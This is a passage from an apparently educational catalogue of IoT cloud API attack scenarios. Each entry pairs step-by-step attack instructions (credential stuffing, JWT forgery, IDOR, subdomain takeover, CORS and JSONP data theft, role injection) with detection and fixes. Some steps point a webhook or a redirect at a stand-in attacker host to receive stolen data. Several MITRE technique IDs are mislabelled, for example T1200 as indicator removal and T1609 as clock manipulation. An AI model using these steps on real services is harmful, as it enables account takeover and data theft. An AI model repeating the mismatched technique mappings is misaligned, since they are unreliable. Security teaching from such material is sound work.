- **Attack Steps**: Step 1: Use S3Scanner to discover open S3 buckets related to IoT vendors (e.g., iot-firmwares).Step 2: Test access using AWS CLI or browser-based tools.Step 3: Find that bucket allows PUT access without authentication.Step 4: Upload a malicious firmware file or overwrite config files.Step 5: Simulate firmware update requests using the new file to show compromise.Step 6: Educate users on how misconfigured cloud storage leads to real threats.
- **Detection**: Monitor cloud ACLs and enforce access logs
- **Solution**: Lock down cloud storage with IAM and bucket policies
- **Tags**: s3 bucket, cloud exposure, firmware hack

## Insecure API Rate Limits Allow Credential Stuffing

- **Attack Type**: Credential Stuffing
- **Target**: Smart Home App
- **Vulnerability**: No lockout/rate-limiting on login
- **MITRE**: T1110.003 (Password Spraying)
- **Impact**: Unauthorized access, data breach
- **Tools**: Hydra, Burp Suite, SecLists
- **Scenario**: Login API lacks rate limiting, allowing attackers to test thousands of passwords.
- **Attack Steps**: Step 1: Identify the login API endpoint (e.g., /api/auth) using Burp Suite.Step 2: Craft a list of common email addresses and passwords using SecLists.Step 3: Use Hydra or custom Python script to brute-force credentials.Step 4: Observe that the server does not lock out accounts or throttle requests.Step 5: Successfully log in as multiple users by testing hundreds of passwords.Step 6: Simulate how this affects real users with reused credentials.
- **Detection**: Monitor excessive login attempts by IP or account
- **Solution**: Use CAPTCHA, lockout policy, and rate-limiting
- **Tags**: credential stuffing, login abuse, auth api

## Device Info Exposure via Insecure API Pagination

- **Attack Type**: Information Disclosure
- **Target**: Smart Sensors
- **Vulnerability**: Lack of access controls on API pagination
- **MITRE**: T1589.001 (Email Addresses), T1595 (Active Scanning)
- **Impact**: Exposure of location and user-linked data
- **Tools**: Burp Suite, Postman, Python
- **Scenario**: IoT cloud API returns full device records in paginated responses without access control checks.
- **Attack Steps**: Step 1: Access the public API used by the mobile app to list devices (/api/devices?page=1).Step 2: Notice that no auth token is needed for the call.Step 3: Write a small Python script to iterate over pages 1–100 and collect device details.Step 4: Observe data such as device serial number, owner email, status, and GPS.Step 5: Demonstrate how even basic enumeration yields sensitive data from other users.Step 6: Log affected device IDs to simulate exposure statistics.
- **Detection**: Monitor large volume of unauthenticated paged requests
- **Solution**: Enforce authentication and per-user scoping for paginated results
- **Tags**: pagination, data leak, insecure api

## API Parameter Tampering to Access Other User’s Data

- **Attack Type**: IDOR (Insecure Direct Object Reference)
- **Target**: Smart HVAC
- **Vulnerability**: ID-based access without verification
- **MITRE**: T1200 (Indicator Removal on Host)
- **Impact**: Cross-user data leaks
- **Tools**: Burp Suite, Postman, ZAP
- **Scenario**: The API allows users to specify resource IDs directly without checking ownership.
- **Attack Steps**: Step 1: Login to the mobile app and intercept API call like /user/device/12345/logs.Step 2: Change the 12345 to 12346 in Burp Suite and forward the request.Step 3: If the API lacks proper ownership validation, it returns another user's data.Step 4: Repeat for different values and simulate a mass data leakage.Step 5: Show this in a lab dashboard by highlighting how easy IDOR vulnerabilities are.Step 6: Record responses and sort logs by device IDs for training purposes.
- **Detection**: Monitor for unusual access patterns across user IDs
- **Solution**: Use UUIDs + verify ownership on server side
- **Tags**: idor, parameter tampering, data exposure

## JWT Token Forgery Due to Weak Signing Secret

- **Attack Type**: Authentication Bypass
- **Target**: Smart Thermostat
- **Vulnerability**: Weak JWT secret allows token forgery
- **MITRE**: T1552.004 (Unsecured Credentials)
- **Impact**: Full account takeover
- **Tools**: JWT.io, JohnTheRipper, Postman, Burp Suite
- **Scenario**: JWT tokens used in API can be forged because of weak or guessable secret.
- **Attack Steps**: Step 1: Capture a valid JWT using Burp Suite and decode it using JWT.io.Step 2: Identify the alg field as HS256 and attempt to brute-force the secret key.Step 3: Use JohnTheRipper or dictionary attack to find the secret (e.g., iot2023 or password).Step 4: Craft a forged JWT with elevated privileges (e.g., "role": "admin").Step 5: Use Postman to submit API requests with the fake token.Step 6: Demonstrate access to admin-only functions like account management or firmware control.
- **Detection**: Check for mismatched JWT signature validations
- **Solution**: Use long, random signing keys; rotate secrets regularly
- **Tags**: jwt, forgery, auth bypass

## Misconfigured CORS Policy in Cloud APIs

- **Attack Type**: Cross-Origin Request Exploit
- **Target**: Any IoT Device
- **Vulnerability**: Wildcard CORS settings
- **MITRE**: T1133 (External Remote Services)
- **Impact**: Cross-domain data theft
- **Tools**: CURL, Burp Suite, CORS Misconfig Scanner
- **Scenario**: Poorly configured CORS allows external domains to interact with cloud APIs.
- **Attack Steps**: Step 1: Test API endpoint headers using curl -I https://api.iotdevice.com/data.Step 2: Observe the Access-Control-Allow-Origin: * header being returned.Step 3: Host a malicious HTML page that sends cross-origin requests to the API.Step 4: Open the page in a browser and retrieve user data via JavaScript.Step 5: Capture the response in developer console to demonstrate data exfiltration.Step 6: Simulate the entire attack in a classroom using localhost CORS lab.
- **Detection**: Scan CORS headers for wildcard origins
- **Solution**: Restrict CORS to trusted domains only
- **Tags**: cors, cross-site, api leak

## Lack of MFA on Cloud Console API Access

- **Attack Type**: Cloud Console Abuse
- **Target**: IoT Cloud Admin Panel
- **Vulnerability**: No MFA enforcement on privileged users
- **MITRE**: T1078 (Valid Accounts)
- **Impact**: Full cloud control with reused creds
- **Tools**: Shodan, Postman, HaveIBeenPwned
- **Scenario**: Admin API access via cloud console lacks MFA, making credential reuse risky.
- **Attack Steps**: Step 1: Find a leaked credential set (email & password) of an IoT admin using pastebin or HIBP.Step 2: Log in to the cloud IoT admin panel or console (e.g., console.iotvendor.com).Step 3: Observe that no MFA is required even for admin access.Step 4: Use Postman or the browser developer tools to explore APIs like /admin/devices/rebootAll.Step 5: Simulate a full control takeover by issuing cloud-level commands.Step 6: Demonstrate the lack of step-up authentication in a training lab.
- **Detection**: Monitor login IPs, enforce policy checks
- **Solution**: Enforce MFA at login + on sensitive operations
- **Tags**: mfa, reused creds, cloud takeover

## Exposure of Internal API via API Gateway Bypass

- **Attack Type**: API Gateway Misrouting
- **Target**: Any IoT System
- **Vulnerability**: Misconfigured routing rules expose internal API
- **MITRE**: T1190 (Exploit Public-Facing App)
- **Impact**: Remote access to internal infrastructure
- **Tools**: Burp Suite, Traceroute, Postman
- **Scenario**: An attacker bypasses the API Gateway and accesses backend APIs directly.
- **Attack Steps**: Step 1: Map the API Gateway URLs from mobile app (e.g., api.iotvendor.com).Step 2: Modify the host headers or subdomains to probe internal paths (e.g., internal.api.iotvendor.com).Step 3: Use Burp Suite to replay API requests to these paths.Step 4: Gain access to internal functions like /api/devTools/restartService.Step 5: Demonstrate internal function access and simulate cloud crash scenarios.Step 6: Log differences between gateway and direct backend response headers.
- **Detection**: Analyze headers, IPs, and subdomain responses
- **Solution**: Restrict internal APIs to private networks or auth
- **Tags**: gateway bypass, internal api, cloud

## Unauthenticated Firmware Query via Public API

- **Attack Type**: Firmware Enumeration
- **Target**: Smart Locks
- **Vulnerability**: Public access to sensitive firmware info
- **MITRE**: T1595.002 (Enumerate Software)
- **Impact**: Targeted firmware vulnerability attacks
- **Tools**: Burp Suite, Nmap, Postman
- **Scenario**: Firmware version info accessible via public unauthenticated API.
- **Attack Steps**: Step 1: Discover firmware check endpoint like /api/firmware/check used by mobile app.Step 2: Intercept request and remove authentication headers.Step 3: Observe that the API still returns version info.Step 4: Enumerate all device models by changing parameters in the request.Step 5: Use version info to find known CVEs linked to those models.Step 6: Simulate how attackers prepare targeted firmware exploits using this info.
- **Detection**: Require auth for any firmware-related API
- **Solution**: Authenticate + throttle firmware info APIs
- **Tags**: firmware, versioning, info leak

## Unauthorized Device Binding via Insecure API

- **Attack Type**: Device Binding Hijack
- **Target**: Smart Door Lock
- **Vulnerability**: No validation on binding request
- **MITRE**: T1199 (Trusted Relationship)
- **Impact**: Full user lockout, control hijack
- **Tools**: Postman, Burp Suite, Mobile App
- **Scenario**: Cloud API allows re-binding of IoT devices to new users without validation.
- **Attack Steps**: Step 1: Obtain a device serial number by observing packaging or mobile app.Step 2: Craft an API request to /api/device/bind with the serial and new user ID.Step 3: Notice no OTP/email confirmation or ownership check.Step 4: Submit the request and hijack the device ownership.Step 5: Demonstrate ownership switch by accessing cloud dashboard with new credentials.Step 6: Simulate remote lockout of original user.
- **Detection**: Track binding events and alert original user
- **Solution**: Use ownership verification and confirmation loop
- **Tags**: bind hijack, ownership spoof, api

## Public Exposure of GraphQL Schema

- **Attack Type**: API Introspection Abuse
- **Target**: Smart Gateway
- **Vulnerability**: Open introspection queries allowed
- **MITRE**: T1069.002 (Permission Groups Discovery)
- **Impact**: Internal data and function enumeration
- **Tools**: GraphQL Voyager, Burp Suite, Postman
- **Scenario**: GraphQL endpoint exposes internal schema, fields, and queries to unauthenticated users.
- **Attack Steps**: Step 1: Discover GraphQL endpoint like /graphql used by the mobile app.Step 2: Submit { __schema { types { name } } } query to test introspection.Step 3: If allowed, map entire API schema using GraphQL Voyager.Step 4: Find hidden fields like adminUsers, debugLogs, etc.Step 5: Submit exploratory queries to test data exposure and privileges.Step 6: Simulate data leaks via unrestricted GraphQL exploration.
- **Detection**: Disable introspection for unauthenticated users
- **Solution**: Restrict schema introspection to internal/admin use
- **Tags**: graphql, introspection, schema leak

## Cloud Misrouting via Subdomain Takeover

- **Attack Type**: DNS Misconfiguration Exploit
- **Target**: Mobile IoT App
- **Vulnerability**: Orphaned DNS entries still in use
- **MITRE**: T1583.008 (DNS Takeover)
- **Impact**: Credential capture, fake firmware injection
- **Tools**: Subjack, Burp Suite, AWS Route 53
- **Scenario**: A forgotten subdomain used for API communication is left pointing to a non-existent host.
- **Attack Steps**: Step 1: Use Subjack or similar tools to find dangling subdomains like api-old.iotvendor.com.Step 2: Claim the orphaned subdomain by pointing it to your own server.Step 3: Observe if mobile apps still send requests to the old subdomain.Step 4: Serve fake APIs and capture credentials, commands, or tokens.Step 5: Simulate the scenario by having lab clients resolve DNS to attacker-controlled server.Step 6: Log captured data and highlight cloud misrouting risks.
- **Detection**: Scan DNS zones and verify active/inactive records
- **Solution**: Remove unused subdomains or redirect to safe sink
- **Tags**: dns, takeover, misconfig, subdomain

## Lack of API Response Throttling Enables Brute Force Device Discovery

- **Attack Type**: Device Enumeration
- **Target**: Smart Sensors / Meters
- **Vulnerability**: Unthrottled and predictable API queries
- **MITRE**: T1595 (Active Scanning)
- **Impact**: Privacy breach, targeted attacks
- **Tools**: Burp Suite, Python, ffuf
- **Scenario**: An attacker brute-forces thousands of device IDs using API requests to discover active smart devices.
- **Attack Steps**: Step 1: Observe the pattern of device IDs used in the API, such as /device/10001/status.Step 2: Use a Python script or ffuf to send thousands of requests by incrementing the device ID.Step 3: Record responses that differ from error messages, indicating active devices.Step 4: Extract metadata from the positive hits like model, owner name, last online timestamp.Step 5: Show the enumeration process visually in a spreadsheet to demonstrate device scanning.Step 6: Simulate a full list of discovered devices in a fake training environment.
- **Detection**: Rate-limit failed or repeated API requests
- **Solution**: Introduce CAPTCHAs, API tokens, and rate control
- **Tags**: device discovery, bruteforce, scan

## Insecure API Response Caching Leaks Sensitive Data

- **Attack Type**: Cache Poisoning
- **Target**: Smart Home Platform
- **Vulnerability**: Public caching of private data
- **MITRE**: T1606.001 (Cache Poisoning)
- **Impact**: Cross-user data disclosure
- **Tools**: Burp Suite, Redis, Postman, ZAP
- **Scenario**: Misconfigured cache proxies store and serve sensitive user responses to unauthorized clients.
- **Attack Steps**: Step 1: Monitor cloud API responses and headers to identify caching behavior (e.g., Cache-Control: public).Step 2: Visit an endpoint that returns personalized data like /api/user/dashboard.Step 3: Log out and revisit using another account; observe if old data is served.Step 4: Simulate a proxy cache serving another user’s home data.Step 5: Perform repeated visits and monitor variations in returned data to confirm caching leak.Step 6: Show how an attacker could harvest cached responses at scale.
- **Detection**: Detect improper cache headers and patterns
- **Solution**: Configure cache-control properly for personalized data
- **Tags**: cache leak, api response, privacy

## API Time-Based Access Control Bypass

- **Attack Type**: Time Logic Exploit
- **Target**: Time-Locked Smart Device
- **Vulnerability**: No server-side validation of time fields
- **MITRE**: T1609 (Clock Manipulation)
- **Impact**: Bypass scheduled access restrictions
- **Tools**: Postman, Fiddler, Burp Suite
- **Scenario**: An API implements access windows but does not enforce strict time-based checks server-side.
- **Attack Steps**: Step 1: Observe a mobile app feature that only allows API calls during specific hours (e.g., 9 AM – 5 PM).Step 2: Intercept the request with Burp Suite and modify the local timestamp in headers.Step 3: Replay the request after hours using the spoofed header (X-Timestamp: 10:00).Step 4: API accepts the request without validating the server-side clock.Step 5: Demonstrate this loophole by triggering time-restricted device actions outside the allowed window.Step 6: Simulate a lab clock bypass with activity logs.
- **Detection**: Compare client timestamps with actual server time
- **Solution**: Use server-side time enforcement for access controls
- **Tags**: timestamp, access control, clock spoof

## Webhook Hijack via Insecure Callback Registration

- **Attack Type**: Webhook Redirection
- **Target**: Smart Meter
- **Vulnerability**: Unvalidated webhook registration
- **MITRE**: T1133 (External Remote Services)
- **Impact**: Data redirection and leakage
- **Tools**: Ngrok, Postman, Burp Suite, Webhook.site
- **Scenario**: An attacker registers their own server URL as a webhook endpoint for alert delivery.
- **Attack Steps**: Step 1: Register for a user account in a smart energy app that supports custom webhooks (e.g., /api/setWebhook).Step 2: Observe that webhook URLs are not verified or validated.Step 3: Submit a malicious webhook (e.g., http://attacker.ngrok.io/receive).Step 4: Trigger an event (e.g., temperature threshold breach) that causes a webhook push.Step 5: Log the full data received on your server from the cloud API.Step 6: Simulate stolen sensor readings or device state alerts.
- **Detection**: Log webhook destinations and verify domains
- **Solution**: Allow only validated or internal webhook URLs
- **Tags**: webhook hijack, redirect, exfil

## Device Configuration Overwrite via API Without Role Check

- **Attack Type**: Role Escalation
- **Target**: Industrial IoT Gateway
- **Vulnerability**: Missing role-based access checks
- **MITRE**: T1548 (Abuse Elevation Control Mechanism)
- **Impact**: Misuse of admin-level controls
- **Tools**: Burp Suite, Postman, ZAP, JWT.io
- **Scenario**: A regular user’s API key allows submitting configuration changes meant for admin users.
- **Attack Steps**: Step 1: Capture API calls to endpoints like /api/device/configure.Step 2: Log the token being used and decode it via JWT.io.Step 3: Observe the user role in the payload as "role": "user".Step 4: Try submitting configuration updates like power thresholds or reboot schedules using the same token.Step 5: API accepts the call despite lack of elevated permissions.Step 6: Show the classroom how lack of RBAC can lead to dangerous misconfigurations.
- **Detection**: Implement strict RBAC and scope validation
- **Solution**: Validate user roles before allowing critical API actions
- **Tags**: rbac, config overwrite, elevation

## Device Reset API Accepts GET Instead of POST

- **Attack Type**: HTTP Method Misuse
- **Target**: Any Device with Reset Option
- **Vulnerability**: Unsafe HTTP method for state-changing API
- **MITRE**: T1203 (Exploitation of Client Execution)
- **Impact**: Triggering resets via link or iframe
- **Tools**: Postman, Curl, ZAP, Burp Suite
- **Scenario**: Critical APIs like device reset are accessible via GET requests, enabling accidental or malicious triggering.
- **Attack Steps**: Step 1: Test API endpoints like /api/device/reset using different methods.Step 2: Observe that a simple GET request triggers a full factory reset.Step 3: Craft a link like http://iotcloud.com/api/device/reset?device=abc123.Step 4: Simulate accidental reset via image loading or phishing link.Step 5: Document misuse of GET where idempotent methods should be enforced.Step 6: Demonstrate in lab using safe virtual IoT devices.
- **Detection**: Monitor GET requests on sensitive endpoints
- **Solution**: Use POST/PUT for state-changing operations; CSRF tokens
- **Tags**: http methods, reset api, csrf

## Insecure Mobile App Logs Cloud API Tokens

- **Attack Type**: Token Leakage in Logs
- **Target**: Mobile IoT App
- **Vulnerability**: Logging sensitive auth headers
- **MITRE**: T1552.004 (Unsecured Credentials)
- **Impact**: Access token reuse, impersonation
- **Tools**: ADB, Logcat, Android Studio, Postman
- **Scenario**: The mobile app writes sensitive access tokens to local logs, which can be retrieved from device.
- **Attack Steps**: Step 1: Install the target mobile app on an emulator or rooted Android device.Step 2: Use adb logcat to monitor the device’s system logs.Step 3: Trigger login or device control actions within the app.Step 4: Observe logs for entries like Authorization: Bearer <token>.Step 5: Copy token and replay the request via Postman to access APIs.Step 6: Simulate the entire process for non-technical students via emulator recording.
- **Detection**: Review logs for sensitive data; mobile app audits
- **Solution**: Avoid logging tokens, sanitize logs
- **Tags**: mobile app, logcat, auth leak

## API Returns Excessive Error Details on Failure

- **Attack Type**: Verbose Error Exposure
- **Target**: Any Cloud API
- **Vulnerability**: Detailed errors expose system internals
- **MITRE**: T1069.003 (Permission Group Discovery)
- **Impact**: Internal knowledge for attack planning
- **Tools**: Burp Suite, Postman, ZAP, ErrorSniper
- **Scenario**: APIs return full stack traces and database info upon bad requests.
- **Attack Steps**: Step 1: Send malformed JSON payloads to various API endpoints (e.g., missing brackets).Step 2: Observe error responses for detailed stack traces or database structure (SQLSyntaxError etc).Step 3: Use this information to plan injection points or exploit API structure.Step 4: Log responses and build a list of internal paths, table names, or debug parameters.Step 5: Demonstrate in classroom how verbose errors help attackers.Step 6: Train on proper error handling and user-friendly messages.
- **Detection**: Scan APIs with malformed inputs and review logs
- **Solution**: Use generic error messages and proper exception handling
- **Tags**: verbose error, debug info, disclosure

## API Accepts JSONP Response for Sensitive Data

- **Attack Type**: JSONP Exploit
- **Target**: IoT Cloud Dashboard
- **Vulnerability**: JSONP callback support without validation
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Cross-origin user data theft
- **Tools**: Burp Suite, Browser, Live Server
- **Scenario**: API supports callback parameter enabling cross-origin data theft via script injection.
- **Attack Steps**: Step 1: Interact with endpoint like /api/user/data?callback=myFunc.Step 2: Observe if server wraps JSON inside myFunc(...) – indicating JSONP support.Step 3: Create an HTML page with a script tag pointing to that URL.Step 4: Load the page and see if it executes the function with private data.Step 5: Simulate theft of user dashboard data in a cross-domain attack.Step 6: Explain the role of modern CORS over JSONP to students.
- **Detection**: Detect use of callback= in API parameters
- **Solution**: Disable JSONP; switch to CORS-based auth flows
- **Tags**: jsonp, callback, script injection

## Unvalidated Input in Cloud-Based Alert Message API

- **Attack Type**: Message Injection
- **Target**: IoT Alerting System
- **Vulnerability**: User-facing messages lack input validation
- **MITRE**: T1565.001 (Stored XSS)
- **Impact**: Alert manipulation, social engineering
- **Tools**: Postman, Burp Suite, ZAP, Ngrok
- **Scenario**: Cloud API sends user-facing alerts without validating message body, enabling attacker-defined alerts.
- **Attack Steps**: Step 1: Identify API used to send alerts like /api/alert/send with parameters such as message, device_id.Step 2: Observe no validation or sanitization of message field.Step 3: Inject scripts, misleading alerts (e.g., "Security Breach Detected") or fake warnings.Step 4: Demonstrate how attacker can socially engineer users via alert abuse.Step 5: Simulate mobile alert panel with injected messages.Step 6: Educate students on API sanitization and secure UI message handling.
- **Detection**: Sanitize all message inputs at API level
- **Solution**: Use message templates with server-side enforcement
- **Tags**: alert injection, xss, input validation

## Cloud API Accepts Wildcard Device Commands

- **Attack Type**: Command Injection
- **Target**: IoT Actuator / Smart Switch
- **Vulnerability**: Lack of input validation on device selectors
- **MITRE**: T1203 (Exploitation for Client Execution)
- **Impact**: Mass control execution
- **Tools**: Postman, Burp Suite, Mobile App
- **Scenario**: A command API accepts wildcards or "ALL" identifiers, letting attackers send bulk actions to all devices.
- **Attack Steps**: Step 1: Analyze traffic between mobile app and the command API.Step 2: Intercept command like POST /api/command with payload { "device_id": "XYZ123", "action": "reboot" }.Step 3: Modify the device_id field to "*" or "ALL" and replay the request.Step 4: API processes the command across all registered devices.Step 5: In a simulation, demonstrate this by issuing a bulk shutdown on virtual devices.Step 6: Use logs to show wide-scale unintended execution.
- **Detection**: Monitor multiple device commands from same source
- **Solution**: Enforce strict validation of device_id fields
- **Tags**: wildcard command, device fleet abuse

## API Version Mismatch Leads to Insecure Legacy Endpoint Exposure

- **Attack Type**: Legacy API Abuse
- **Target**: Any IoT Device Backend
- **Vulnerability**: Deprecated, unmonitored API versions
- **MITRE**: T1190 (Exploit Public-Facing Application)
- **Impact**: Unauthorized access using legacy APIs
- **Tools**: Burp Suite, ffuf, Postman
- **Scenario**: Older API versions remain active and unpatched, exposing outdated authentication mechanisms.
- **Attack Steps**: Step 1: Use ffuf to brute-force API versions (/api/v1/, /api/v2/, etc.).Step 2: Discover that /api/v1/ still responds with weaker auth or open endpoints.Step 3: Send requests to legacy paths and observe access to device management features.Step 4: Demonstrate bypassing MFA or token-based checks active in newer APIs.Step 5: Show the importance of versioning and deprecation in an educational setup.
- **Detection**: Log version usage; alert on deprecated endpoint traffic
- **Solution**: Remove or secure old API versions
- **Tags**: api versioning, legacy endpoint, deprecated

## Rate-Limit Bypass Using IP Rotation

- **Attack Type**: DoS Amplification
- **Target**: IoT Dashboard
- **Vulnerability**: IP-only based throttling
- **MITRE**: T1110.003 (Password Spraying)
- **Impact**: Brute force login and credential stuffing
- **Tools**: Tor, ProxyChains, Python, Hydra
- **Scenario**: Attackers bypass rate limits by sending requests from multiple IPs using VPNs or botnets.
- **Attack Steps**: Step 1: Set up a VPN or Tor connection using ProxyChains.Step 2: Identify an API endpoint with a rate limit like /api/login.Step 3: Use a Python script to rotate IPs and continue brute-forcing credentials without triggering block.Step 4: Demonstrate in lab using rotating proxies and logs showing repeated failures from different IPs.Step 5: Emphasize need for account-level throttling, not just IP-based.
- **Detection**: Monitor repeated actions on same account from varied IPs
- **Solution**: Use per-user rate-limiting and behavioral analysis
- **Tags**: rate-limit bypass, ip rotation, throttling

## Insecure API Discovery via Mobile App Debug Mode

- **Attack Type**: Reconnaissance
- **Target**: IoT Mobile Interface
- **Vulnerability**: Overexposed debug info and APIs
- **MITRE**: T1087.002 (Browser Session Information)
- **Impact**: Access to admin APIs and hidden functions
- **Tools**: ADB, Android Studio, Logcat, APKTool
- **Scenario**: Debug logs reveal full API structure and keys in mobile app log files or dev menus.
- **Attack Steps**: Step 1: Install mobile app in an emulator and enable developer mode.Step 2: Use adb logcat to view logs while interacting with the app.Step 3: Observe full API endpoints (e.g., https://api.iotvendor.com/v1/admin/rebootAll) logged during app usage.Step 4: Copy tokens and test undocumented APIs via Postman.Step 5: Simulate unauthorized use of internal APIs exposed via debug logs.
- **Detection**: Audit app logs and code for exposed URLs and tokens
- **Solution**: Disable debug logs in production builds
- **Tags**: debug logs, recon, app info leak

## Cloud API Accepts Insecure Redirect URLs

- **Attack Type**: Open Redirect for Phishing
- **Target**: IoT Dashboard
- **Vulnerability**: Open redirect parameter without validation
- **MITRE**: T1204.002 (User Execution via Phishing Link)
- **Impact**: Credential phishing and brand abuse
- **Tools**: Burp Suite, Postman, Redirect Scanner
- **Scenario**: API allows redirect to any URL after authentication or action, enabling phishing redirection.
- **Attack Steps**: Step 1: Observe an endpoint like /api/login?redirect=https://iotvendor.com/dashboard.Step 2: Change it to /api/login?redirect=https://attacker.com/fake.Step 3: API accepts it and redirects users to attacker site post-login.Step 4: Create a phishing clone of the dashboard and demonstrate redirection.Step 5: Highlight in simulation how users can be socially engineered via legit-looking URLs.
- **Detection**: Monitor redirects to non-approved domains
- **Solution**: Whitelist only safe redirect domains
- **Tags**: redirect abuse, phishing, open redirect

## Cloud Function Triggered via Unauthenticated API Call

- **Attack Type**: Unprotected Automation
- **Target**: Smart Device Update Server
- **Vulnerability**: Missing authentication on sensitive triggers
- **MITRE**: T1609 (Service Execution)
- **Impact**: Forced firmware or function execution
- **Tools**: Postman, Burp Suite, Python
- **Scenario**: A cloud function (e.g., firmware update scheduler) is callable via public API without authentication.
- **Attack Steps**: Step 1: Identify an endpoint like /api/scheduler/triggerUpdate used by admin dashboard.Step 2: Remove auth headers and replay request.Step 3: Observe API still executes the update command.Step 4: In simulation, use virtual IoT devices to show forced OTA update trigger.Step 5: Document how critical workflows can be hijacked without auth.
- **Detection**: Alert on unauthenticated access to sensitive routes
- **Solution**: Enforce authentication checks on all functions
- **Tags**: cloud function, firmware, no auth

## Error Message Reveals Database Engine and Structure

- **Attack Type**: Recon via Error
- **Target**: Any IoT Web API
- **Vulnerability**: Verbose database errors
- **MITRE**: T1499 (Endpoint DoS)
- **Impact**: Recon + prep for SQLi and injection
- **Tools**: Postman, Burp Suite, ZAP
- **Scenario**: API returns SQL error messages disclosing database structure or engine (e.g., PostgreSQL).
- **Attack Steps**: Step 1: Send a malformed request like POST /api/user?id=' to induce an error.Step 2: Observe detailed error like PostgreSQL syntax error near '...'.Step 3: Use this information to construct SQL injection strings or plan further attacks.Step 4: Demonstrate how error verbosity increases attacker’s knowledge.Step 5: Teach mitigation by logging errors internally but responding generically.
- **Detection**: Log and alert on error anomalies
- **Solution**: Return user-friendly messages, suppress stack traces
- **Tags**: sql error, database disclosure

## API Headers Accept Spoofed App Versions

- **Attack Type**: Version-Specific Logic Abuse
- **Target**: Smart Control API
- **Vulnerability**: Trusting headers without validation
- **MITRE**: T1565 (Input Manipulation)
- **Impact**: Policy bypass via spoofed metadata
- **Tools**: Burp Suite, Postman
- **Scenario**: API behavior changes based on X-App-Version, allowing older version spoofing to bypass new checks.
- **Attack Steps**: Step 1: Intercept a request from mobile app and note the header X-App-Version: 3.5.1.Step 2: Modify the version to 2.0.0 and replay the request.Step 3: Observe the server skipping rate limits or CAPTCHA checks for older versions.Step 4: Use this to flood endpoints or bypass security measures.Step 5: Show the class how header spoofing can allow policy bypasses.
- **Detection**: Enforce same logic regardless of version header
- **Solution**: Don’t trust client-supplied version fields
- **Tags**: app version spoofing, header abuse

## Mobile App Performs Local Decryption of Cloud Tokens

- **Attack Type**: Client-Side Crypto Misuse
- **Target**: IoT Companion App
- **Vulnerability**: Hardcoded cryptographic material
- **MITRE**: T1552.001 (Credential in Files)
- **Impact**: Full token recovery and replay
- **Tools**: APKTool, MobSF, Android Studio, Burp Suite
- **Scenario**: The app stores encrypted cloud tokens and decrypts them locally using hardcoded key.
- **Attack Steps**: Step 1: Decompile the APK using APKTool or analyze with MobSF.Step 2: Find a function that uses AES to decrypt a token from shared preferences.Step 3: Identify hardcoded key or IV used in the decryption process.Step 4: Recreate the decryptor script to extract valid cloud API tokens.Step 5: Simulate login/session hijack without actual credentials.
- **Detection**: Audit apps for cryptographic misuse
- **Solution**: Perform server-side encryption/decryption only
- **Tags**: crypto misuse, mobile app, token decrypt

## Cloud API Accepts Overlong Inputs Leading to Buffer Issues

- **Attack Type**: Buffer Overflow Prep
- **Target**: Device Config API
- **Vulnerability**: Lack of input size validation
- **MITRE**: T1203 (Exploit Client Execution)
- **Impact**: Crash, DoS, potential memory corruption
- **Tools**: Postman, Python, Fuzzing tools
- **Scenario**: API does not validate input lengths, potentially leading to overflow or crashes.
- **Attack Steps**: Step 1: Identify API fields like device_name or config_param.Step 2: Submit values like A*5000 to these fields via Postman.Step 3: Observe server response—timeout, crash, or HTTP 500 errors.Step 4: Log abnormal responses and potential memory leakage.Step 5: Show students how poor input validation can be a gateway to low-level exploits.
- **Detection**: Monitor unusually large payload sizes
- **Solution**: Set strict input validation and length limits
- **Tags**: overflow, input fuzzing, buffer crash

## Token Reuse Across Sessions Due to Missing Expiry Checks

- **Attack Type**: Session Hijacking
- **Target**: Smart Cloud Dashboard
- **Vulnerability**: No server-side expiry enforcement
- **MITRE**: T1550.003 (Web Session Cookie)
- **Impact**: Unauthorized persistent access
- **Tools**: Burp Suite, Postman, JWT.io
- **Scenario**: The cloud API accepts long-expired tokens, enabling old session hijacks.
- **Attack Steps**: Step 1: Capture an access token from a valid session using Burp Suite.Step 2: Note the token’s expiry timestamp in JWT.io (e.g., exp: 1683030000).Step 3: Wait until token has expired, or manually edit system time to simulate expiration.Step 4: Replay the expired token in an API request.Step 5: If the server accepts the expired token, this confirms poor session validation.Step 6: Show how long-dead sessions can be reused by attackers with access to old logs.
- **Detection**: Analyze token usage timestamps and match with TTLs
- **Solution**: Enforce strict expiry validation and server-side checks
- **Tags**: jwt, token reuse, session hijack

## Device Shadow Manipulation via Public API

- **Attack Type**: State Injection
- **Target**: Smart Meter / IoT Alarm
- **Vulnerability**: Public write access to device shadow state
- **MITRE**: T1110.004 (Application Layer Protocol Abuse)
- **Impact**: False alarms, misleading analytics
- **Tools**: AWS CLI, Postman, Burp Suite
- **Scenario**: Device "shadow" state in cloud is editable by anyone due to misconfigured permissions.
- **Attack Steps**: Step 1: Identify device shadow endpoint such as /api/device/shadow/update.Step 2: Send a POST request with arbitrary values like { "status": "overheated", "temp": "999" }.Step 3: Observe changes reflected in user dashboards and alerts.Step 4: No authentication or role check was required.Step 5: Simulate a false-alarm scenario where dozens of fake alerts are generated via API spam.Step 6: Emphasize how device state manipulation could trigger cascading automated responses.
- **Detection**: Monitor high-frequency updates to shadow APIs
- **Solution**: Restrict shadow updates to authenticated sessions only
- **Tags**: device shadow, api abuse, state spoofing

## User Role Switching via API Parameter Manipulation

- **Attack Type**: Privilege Escalation
- **Target**: Smart Admin Panel
- **Vulnerability**: Trusting client-side role assignments
- **MITRE**: T1548 (Abuse Elevation Control Mechanism)
- **Impact**: Unauthorized privilege gain
- **Tools**: Postman, Burp Suite, ZAP
- **Scenario**: The API trusts the client-provided role field during user registration or updates.
- **Attack Steps**: Step 1: Intercept registration or profile update API call using Burp Suite.Step 2: Modify the request to include "role": "admin" in the JSON body.Step 3: Submit the request and confirm role change via API dashboard or response body.Step 4: Access new admin-only API endpoints like /admin/devices/remove.Step 5: Demonstrate how this bypass grants control over other users’ devices.Step 6: Simulate the attack in a sandbox with visible role transition logs.
- **Detection**: Log unexpected role changes and alert admins
- **Solution**: Enforce role logic only server-side; never from user input
- **Tags**: role change, privilege escalation, api param abuse

## GraphQL Mutation Allows Bulk Data Injection

- **Attack Type**: Data Tampering
- **Target**: GraphQL-based IoT Backend
- **Vulnerability**: Unauthenticated GraphQL mutations
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Unauthorized bulk object creation
- **Tools**: GraphQL Playground, Burp Suite, Postman
- **Scenario**: An insecure mutation lets attackers inject multiple records in a single unauthenticated GraphQL call.
